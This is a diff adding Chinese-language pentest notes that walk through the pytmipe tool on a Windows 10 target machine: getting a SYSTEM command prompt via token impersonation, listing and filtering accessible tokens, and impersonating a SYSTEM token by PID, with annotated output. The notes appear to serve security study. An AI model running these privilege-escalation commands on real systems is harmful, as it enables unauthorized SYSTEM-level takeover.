@@ -170,6 +170,113 @@ imp.searchAndImpersonateFirstSystemToken(targetPID=None, printAllTokens=False)
 
 ---
 
+> 环境： Win10 Pro 22H2 + Python 3.10.6
+
+将仓库 clone 下来然后放到靶机上，cd 进入项目 src 目录， 先安装依赖：
+
+```bash
+pip install -r requirements.txt
+```
+
+![image-20241206144237768](http://cdn.ayusummer233.top/DailyNotes/202412061442870.png)
+
+然后
+
+```bash
+python.exe tmipe.py searchimpfirstsystem -vv
+```
+
+![image-20241206144340489](http://cdn.ayusummer233.top/DailyNotes/202412061443559.png)
+
+窗口流程跑完会弹出一个 CMD，查看当前用户可以发现已经是 `nt authority/system` 了
+
+![image-20241206144409535](http://cdn.ayusummer233.top/DailyNotes/202412061444585.png)
+
+---
+
+#### 示例2-获取token
+
+For getting primary and impersonation(s) tokens used in current process:
+
+```bash
+python.exe tmipe.py printalltokens --current --full --linked
+```
+
+![image-20241206155908409](http://cdn.ayusummer233.top/DailyNotes/202412061559579.png)
+
+为了获取当前线程可访问的所有令牌，按 pid 组织，当只有可能进行模拟时：
+
+```bash
+python.exe tmipe.py printalltokensbypid --imp-only
+```
+
+![image-20241206160822237](http://cdn.ayusummer233.top/DailyNotes/202412061608453.png)
+
+使用 pytmipe 库执行此操作的话如下编写：
+
+```python
+from impersonate import Impersonate
+from utils import configureLogging
+
+configureLogging()
+imp = Impersonate()
+imp.printAllTokensAccessible(targetPID=None, printFull=True, printLinked=True, _useThreadMethod=False)
+```
+
+---
+
+#### 示例3-模拟token
+
+要模拟一个选定的 token 需要先据筛选条件获取所有 token（系统 token 和当前线程可以冒充的 token）：
+
+```cmd
+# 仅显示安全标识符（SID）为 "S-1-5-18"(本地系统账户) 且 canimpersonate 为 true 的令牌
+python tmipe.py printalltokens --filter {\"sid\":\"S-1-5-18\",\"canimpersonate\":true}
+```
+
+![image-20241206165416497](http://cdn.ayusummer233.top/DailyNotes/202412061654667.png)
+
+如下是输出中的一段：
+
+```cmd
+- PID: 27236
+------------------------------
+  - PID: 27236 # 进程标识符（Process ID），标识当前令牌所属的进程
+  - type: Primary (1) # 令牌类型，`Primary (1)` 表示主令牌
+  - token: 1784 # 令牌编号或标识符。 
+  - hval: None # 句柄值，当前为 `None` 表示没有值。
+  - ihandle: None # 模拟句柄，当前为 `None` 表示没有值。
+  - sid: S-1-5-18 # 安全标识符（Security Identifier），`S-1-5-18` 通常代表本地系统账户。
+  - accountname: {'Name': 'SYSTEM', 'Domain': 'NT AUTHORITY', 'type': 5} # Name-账户名称，Domain-账户域，type-5-系统账户
+  - intlvl: System # 完整性级别，这里是 `System`，表示最高级别。
+  - owner: S-1-5-32-544 # 所有者的 SID，这里是 `S-1-5-32-544`，通常代表管理员组。
+  - issystem: True # 是否为系统账户
+  - sessionID: 2 # 话标识符，这里是 `2`，标识特定的用户会话。
+  - elevationtype: Default (1) # 提升类型，`Default (1)` 表示默认提升。
+  - iselevated: True # 是否提升权限，`True` 表示已提升。
+  - linkedtoken: None # 关联的令牌，当前为 `None` 表示没有关联。
+  - tokensource: b'*SYSTEM*' # 令牌来源，这里是 `b'*SYSTEM*'`，表示来自系统。
+  - appcontainertoken: False # 是否为应用容器令牌，`False` 表示不是。
+  - appcontainersid: None # 应用容器的 SID，当前为 `None`。
+  - appcontainernumber: 0 # 应用容器编号，这里是 `0`。
+  - primarysidgroup: S-1-5-18  # 主 SID 组，这里是 `S-1-5-18`。
+  - isrestricted: False # 是否为受限令牌，`False` 表示不是。
+  - hasrestricitions: True # 是否有禁制，`True` 表示有限制。
+  - logonsid: None # 登入 SID，当前为 `None`。
+  - Mandatory Policy: NO_WRITE_UP # 强制策略，这里是 `NO_WRITE_UP`，表示不允许提升写入权限。
+  - canimpersonate: True # 是否可以模拟，`True` 表示可以用于模拟。
+```
+
+这个令牌的 `intlvl` 字段标识当前令牌的完整性级别是 System，PID 为 27236， ihandle 为 None， 可以用于模拟令牌：
+
+```bash
+python tmipe.py imptoken --pid 27236 -vv
+```
+
+![image-20241206172736929](http://cdn.ayusummer233.top/DailyNotes/202412061727012.png)
+
+---
+
 ## CVE
 
 ### TODO:CVE-2024-35250
